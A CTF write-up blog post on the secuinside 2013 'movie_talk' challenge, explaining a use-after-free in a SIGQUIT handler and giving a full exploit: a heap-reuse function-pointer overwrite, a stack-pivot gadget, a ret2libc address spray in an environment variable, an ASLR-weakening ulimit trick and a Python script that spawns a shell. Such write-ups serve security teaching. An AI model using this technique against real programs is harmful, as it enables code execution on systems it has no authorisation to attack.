---
title: secuinside CTF 2013 quals movie_talk writeup
author: kelwin
layout: post
permalink: /secuinside-ctf-2013-quals-movie_talk-writeup/
categories:
  - CTF
  - writeup
---
The program is a local console application that maintain information about movies. It provides add, delete, list operations for users. We noticed that there is a SIGQUIT(number 3) handler to free all allocated data structure of movies, but it failed to clean the pointers of movies, which leads to a use after free bug. Data structure of a movie is as below:

    struct Movie
    {
      void *handler;
      char *name;
      int id;
      int rating;
      int rate
    };
    

For each movie, the memories for the `Movie` struct and `Movie->name` are allocated on the heap. First, we can add a movie. Then, we add the second. However, at the moment before the program prompt to get movie name, we send SIGQUIT and get the first movie structure freed. Then the program get back to receive the second movie&#8217;s name. If we input a string with a appropriate length, the allocated chunk for the second movie&#8217;s name could be the same as the first movie&#8217;s struct, which has just been freed. Luckily, the pointer of the first movie still points to the original chunk. Thus, the first 4 bytes of the second movie&#8217;s name will become the first movie&#8217;s handler, which can be used controlled.

We use an `add esp` gadget to migrate the stack to a very high position of the stack. Then we put a lot of common `ret2libc` combinations `system|system|"/bin/sh"|"/bin/sh"` in an environment variable, which is right in the higher part of the stack. If the `add esp` gadget migrate the stack top and hit the one of the `system` addresses in the environment variable, a shell will be spawned.

Of course, we used the `ulimit -s unlimited` trick to disable ASLR of the shared library. We get the precise address of `system` and `"/binsh"` from the libc library. The environment variable defined by us is as below:

    export EXPLOIT=$(python -c 'print "a"*9 + "\x80\xb2\x06\x40\x80\xb2\x06\x40\xf8\x2f\x19\x40\xf8\x2f\x19\x40" * 2000+"a"*15')
    

Python script for exploitation is as below:

    import sys
    import os
    import subprocess
    import signal
    import time
    p = subprocess.Popen("./movie_talk", stdin=subprocess.PIPE)
    # add $0x228c,%esp
    addesp = "\xed\x15\x14\x40"
    # add first movie
    p.stdin.write("1\n1\n1\n0\n")
    time.sleep(3);
    # add second movie
    p.stdin.write("1\n")
    time.sleep(1)
    # free all movies
    p.send_signal(3)
    p.stdin.write(addesp + "AAAABBB\n1\n0\n")
    time.sleep(3)
    # use after free
    p.stdin.write("3\n")
    time.sleep(1)
    # execute shell command
    p.stdin.write("cat key.txt\n")
    time.sleep(1)